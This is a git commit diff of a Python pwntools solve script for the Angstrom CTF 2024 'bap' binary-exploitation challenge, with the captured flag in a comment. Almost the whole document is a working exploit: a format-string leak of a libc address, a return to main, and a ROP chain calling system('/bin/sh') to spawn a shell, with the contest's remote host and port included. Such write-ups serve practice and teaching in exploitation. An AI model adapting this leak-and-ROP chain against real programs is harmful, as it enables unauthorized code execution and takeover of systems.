4df57f25af9c3631d8d10c70f0f6966567485583
ducdatdau <contact.ducdatdau@gmail.com>
2024-11-16 17:45:36 +0700

    update

--- Angstrom/2024/pwn-bap/solve.py
+++ Angstrom/2024/pwn-bap/solve.py
@@ -1,26 +1,43 @@
 #!/usr/bin/env python3
 from pwn import *
 
-context.binary = elf = ELF("./bap_patched")
+context.update(os = "linux", arch = "amd64", log_level = "debug")
+
+exe = ELF("./bap_patched") 
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.35.so")
-p = process(elf.path)
-p = remote('challs.actf.co', 31323)
 
-payload = b'%29$p'.ljust(24, b'\x00') 
-payload += (p64(elf.symbols['main'] + 5))
-p.sendlineafter(b': ', payload)
+p = process(exe.path)
+# p = remote("challs.actf.co", 31323)
+
+sl  = p.sendline
+sa  = p.sendafter
+sla = p.sendlineafter
+rl  = p.recvline
+ru  = p.recvuntil
+
+def GDB():
+    gdb.attach(p, gdbscript = """
+        continue
+    """)
+    pause() 
+
+# GDB()
+
+pay = b"%29$p".ljust(24, b"\x00") 
+pay += (p64(exe.symbols["main"] + 5))
+sla(b": ", pay)
 
 libc_leak = int(p.recv(14), 16) 
+libc.address = libc_leak - libc.symbols["__libc_start_main_impl"] - 128 
 
-libc.address = libc_leak - libc.symbols['__libc_start_main_impl'] - 128 
-pop_rdi = 0x000000000002a3e5 + libc.address 
-binsh = next(libc.search(b'/bin/sh'))
-system = libc.symbols['system']
-ret = 0x4011ce
+poprdi  = 0x000000000002a3e5 + libc.address 
+binsh   = next(libc.search(b"/bin/sh"))
+system  = libc.symbols["system"]
+ret     = 0x4011ce
 
-payload = b'x' * 24 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
-p.sendlineafter(b': ', payload)
+pay = b"x" * 24 + p64(ret) + p64(poprdi) + p64(binsh) + p64(system)
+sla(b": ", pay)
 
 p.interactive()
-# actf{baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap____}s
+# actf{baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap____}
